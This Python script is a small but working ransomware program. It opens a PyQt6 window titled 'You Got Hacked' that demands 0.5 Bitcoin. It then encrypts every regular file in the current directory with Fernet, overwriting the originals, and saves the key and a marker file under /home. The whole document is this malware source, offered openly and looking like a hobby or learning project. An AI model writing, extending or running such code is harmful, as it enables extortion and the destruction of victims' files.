#! /usr/bin/env python3

import os
from PyQt6.QtWidgets import *
from cryptography.fernet import Fernet

if os.path.exists(f"/home/encrypted.key"):
	exit("Already encrypted ya 3beet")

class GUI:

    app = QApplication([])

    def __init__(self):

        window = QWidget()
        window.setStyleSheet("background-image : url('./src/hacker-4031973__480.png');")
        window.resize(690,470)
        window.move(330,130)
        window.setWindowTitle("You Got Hacked")

        label1 = QLabel("<h2>All your files has been encrypted</h2>", window)
        label1.setStyleSheet("color: white; background-image: url('')");

        label2 = QLabel("<h2>Send me 0.5 Bitcoins to get the password :)</h2>", window)
        label2.setStyleSheet("color: white; background-image: url('')");
        
        label3 = QLabel("<h3>Contact Info. <a href='http://example.com'>example.com</a></h3>", window)
        label3.setStyleSheet("color: red; background-image: url('');");
        label3.setOpenExternalLinks(True);

        btn = QPushButton('OK', window)
        btn.setStyleSheet("background-image: url('')")
        btn.clicked.connect(self.clicked)

        label1.move(190, 150)
        label2.move(130, 185)
        label3.move(0, 440)
        btn.move(320, 240)

        window.show()

        self.app.exec()

    def clicked(self):
        self.app.quit()

GUI()

files = []

for file in os.listdir():

	if file == "ransomware.py" or file == "decrypt.py":
		continue

	if os.path.isfile(file):
		files.append(file)

key = Fernet.generate_key()

with open(f"/home/thekey.key", "wb") as thekey:

	thekey.write(key)

for file in files:

	with open(file, "rb") as thefile:

		content = thefile.read()

	content_encrypted = Fernet(key).encrypt(content)

	with open(file, "wb") as thefile:

		thefile.write(content_encrypted)

with open(f"/home/encrypted.key", "wb") as make_enc :

	make_enc.write(b'1')
